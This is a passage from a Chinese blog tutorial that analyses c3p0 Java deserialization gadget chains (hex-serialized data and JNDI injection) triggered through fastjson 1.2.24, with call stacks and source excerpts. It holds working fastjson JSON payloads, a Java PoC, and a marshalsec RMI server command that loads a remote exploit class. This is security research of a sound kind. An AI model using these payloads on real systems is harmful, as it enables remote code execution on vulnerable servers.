+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">String</span> <span class="nf">bytesToHexString</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="nx">bArray</span><span class="p">,</span> <span class="kt">int</span> <span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">StringBuffer</span> <span class="nx">sb</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">StringBuffer</span><span class="p">(</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="nx">i</span> <span class="p">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">String</span> <span class="nx">sTemp</span> <span class="p">=</span> <span class="nx">Integer</span><span class="p">.</span><span class="nf">toHexString</span><span class="p">(</span><span class="mi">255</span> <span class="o">&amp;</span> <span class="nx">bArray</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">sTemp</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span> <span class="p">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">sb</span><span class="p">.</span><span class="nb">append</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nx">sb</span><span class="p">.</span><span class="nb">append</span><span class="p">(</span><span class="nx">sTemp</span><span class="p">.</span><span class="nf">toUpperCase</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">sb</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面分析到能调用 setter 和 getter ，不难想到 fastjson ，fastjson 的 poc ，这里我拿的是最简单的 1.2.24 版本的来举例的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">hex</span> <span class="o">=</span> <span class="s2">&#34;序列化后的hex数据&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">@type</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><span class="se">\&#34;</span><span class="s2">,&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">userOverridesAsString</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">HexAsciiSerializedMap:&#34;</span> <span class="o">+</span> <span class="n">hex</span> <span class="o">+</span> <span class="s2">&#34;;</span><span class="se">\&#34;</span><span class="s2">,&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="总结-2" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)
+</span></span><span class="line"><span class="cl">fromByteArray:123, SerializableUtils (com.mchange.v2.ser)
+</span></span><span class="line"><span class="cl">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)
+</span></span><span class="line"><span class="cl">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">fireVetoableChange:375, VetoableChangeSupport (java.beans)
+</span></span><span class="line"><span class="cl">fireVetoableChange:271, VetoableChangeSupport (java.beans)
+</span></span><span class="line"><span class="cl">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>fastjson的调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)
+</span></span><span class="line"><span class="cl">fromByteArray:123, SerializableUtils (com.mchange.v2.ser)
+</span></span><span class="line"><span class="cl">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)
+</span></span><span class="line"><span class="cl">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">fireVetoableChange:375, VetoableChangeSupport (java.beans)
+</span></span><span class="line"><span class="cl">fireVetoableChange:271, VetoableChangeSupport (java.beans)
+</span></span><span class="line"><span class="cl">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:137, JSON (com.alibaba.fastjson)
+</span></span><span class="line"><span class="cl">parse:128, JSON (com.alibaba.fastjson)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>简单来说就是 <code>WrapperConnectionPoolDataSource</code> 的构造方法可以触发反序列化恶意hex数据，而<code>setUserOverridesAsString</code> 方法则能对其赋值，fastjson 可以触发任意 setter 方法，不用手动触发</p>
+<h3 id="jndi注入" class="heading-element"><span>JNDI注入</span>
+  <a href="#jndi%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>同样也是在fastjson，jackson环境中可用。jndi适用于jdk8u191以下支持reference情况</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec52006c.png" alt="image-20250317164110447" srcset="https://bu.dusays.com/2025/03/18/67d95ec52006c.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec52006c.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec52006c.png?size=large 2x" data-title="image-20250317164110447" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="调用链-3" class="heading-element"><span>调用链</span>
+  <a href="#%e8%b0%83%e7%94%a8%e9%93%be-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>定位到 <code>com.mchange.v2.c3p0</code> 下的 <code>JndiRefConnectionPoolDataSource</code></p>
+<p>看到其 <code>setLoginTimeout</code> 函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">WrapperConnectionPoolDataSource wcpds;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">public void setLoginTimeout(int seconds) throws SQLException {
+</span></span><span class="line"><span class="cl">        this.wcpds.setLoginTimeout(seconds);
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用了 <code>WrapperConnectionPoolDataSource#setLoginTimeout</code> ，跟进发现又调用了 <code>setLoginTimeout</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public void setLoginTimeout(int seconds) throws SQLException {
+</span></span><span class="line"><span class="cl">        this.getNestedDataSource().setLoginTimeout(seconds);
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进发现 <code>getNestedDataSource()</code> 方法返回的是 <code>this.nestedDataSource</code> ，且发现是 <code>setNestedDataSource</code> 方法对 <code>nestedDataSource</code> 进行赋值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public synchronized DataSource getNestedDataSource() {
+</span></span><span class="line"><span class="cl">        return this.nestedDataSource;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public synchronized void setNestedDataSource(DataSource nestedDataSource) {
+</span></span><span class="line"><span class="cl">        DataSource oldVal = this.nestedDataSource;
+</span></span><span class="line"><span class="cl">        this.nestedDataSource = nestedDataSource;
+</span></span><span class="line"><span class="cl">        if (!this.eqOrBothNull(oldVal, nestedDataSource)) {
+</span></span><span class="line"><span class="cl">            this.pcs.firePropertyChange(&#34;nestedDataSource&#34;, oldVal, nestedDataSource);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过上面分析，我们知道在 <code>JndiRefConnectionPoolDataSource</code> 类调用 <code>setLoginTimeout</code> 时。对 <code>WrapperConnectionPoolDataSource</code> 进行了实例化并调用了 <code>setNestedDataSource</code> 方法为 <code>nestedDataSource</code> 变量赋值</p>
+<p>回头看到 <code>JndiRefConnectionPoolDataSource</code> 的构造类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public JndiRefConnectionPoolDataSource(boolean autoregister) {
+</span></span><span class="line"><span class="cl">        this.jrfds = new JndiRefForwardingDataSource();
+</span></span><span class="line"><span class="cl">        this.wcpds = new WrapperConnectionPoolDataSource();
+</span></span><span class="line"><span class="cl">        this.wcpds.setNestedDataSource(this.jrfds);
+</span></span><span class="line"><span class="cl">        if (autoregister) {
+</span></span><span class="line"><span class="cl">            this.identityToken = C3P0ImplUtils.allocateIdentityToken(this);
+</span></span><span class="line"><span class="cl">            C3P0Registry.reregister(this);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现这里调用了 <code>WrapperConnectionPoolDataSource#setNestedDataSource</code> ，并将 <code>JndiRefForwardingDataSource</code> 类的实例当作参数传入。因此结合前面的分析，我们知道会调用 <code>JndiRefForwardingDataSource#setLoginTimeout</code>，继续跟进看下其实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public void setLoginTimeout(int seconds) throws SQLException {
+</span></span><span class="line"><span class="cl">        this.inner().setLoginTimeout(seconds);
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用了 <code>inner()</code> 方法，继续跟进</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    private synchronized DataSource inner() throws SQLException {
+</span></span><span class="line"><span class="cl">        if (this.cachedInner != null) {
+</span></span><span class="line"><span class="cl">            return this.cachedInner;
+</span></span><span class="line"><span class="cl">        } else {
+</span></span><span class="line"><span class="cl">            DataSource out = this.dereference();
+</span></span><span class="line"><span class="cl">            if (this.isCaching()) {
+</span></span><span class="line"><span class="cl">                this.cachedInner = out;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            return out;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里当 <code>cachedInner</code> 为空时就会调用 <code>dereference</code> ，然后跟进就会发现调用了 <code>lookup</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec47cbb5.png" alt="image-20250317175307454" srcset="https://bu.dusays.com/2025/03/18/67d95ec47cbb5.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec47cbb5.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec47cbb5.png?size=large 2x" data-title="image-20250317175307454" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里 <code>jndiName</code> 的值由 <code>setJndiName</code> 决定</p>
+<h4 id="poc-3" class="heading-element"><span>poc</span>
+  <a href="#poc-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>借助<a href="https://github.com/mbechler/marshalsec"target="_blank" rel="external nofollow noopener noreferrer">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类 exp.class</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:9991/#exp&#34; 9999</span></span></code></pre></td></tr></table>
+</div>
+</div><p>记得在 9991 端口开 http</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">org</span><span class="p">.</span><span class="nx">example</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">com</span><span class="p">.</span><span class="nx">mchange</span><span class="p">.</span><span class="nx">v2</span><span class="p">.</span><span class="nx">c3p0</span><span class="p">.</span><span class="nx">JndiRefConnectionPoolDataSource</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">c3p0_jndi</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span><span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">JndiRefConnectionPoolDataSource</span> <span class="nx">exp</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">JndiRefConnectionPoolDataSource</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exp</span><span class="p">.</span><span class="nf">setJndiName</span><span class="p">(</span><span class="s">&#34;rmi://localhost:9999/hello&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exp</span><span class="p">.</span><span class="nf">setLoginTimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec4829e2.png" alt="image-20250317181450729" srcset="https://bu.dusays.com/2025/03/18/67d95ec4829e2.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec4829e2.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec4829e2.png?size=large 2x" data-title="image-20250317181450729" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>和 hex 那条链子差不多的原理，会用到 setter 方法，那就可以用 fastjson 打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">        <span class="ne">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">@type</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource</span><span class="se">\&#34;</span><span class="s2">,&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">JndiName</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">rmi://localhost:9999/hello</span><span class="se">\&#34;</span><span class="s2">, &#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">LoginTimeout</span><span class="se">\&#34;</span><span class="s2">:0&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="总结-3" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先是创个 <code>JndiRefConnectionPoolDataSource</code> 的实例，让 <code>WrapperConnectionPoolDataSource#setNestedDataSource</code> 的参数值为 <code>JndiRefForwardingDataSource</code> 的实例，方便之后触发 <code>JndiRefForwardingDataSource#setLoginTimeout</code> 打 jndi</p>
+<p>fastjson 的调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
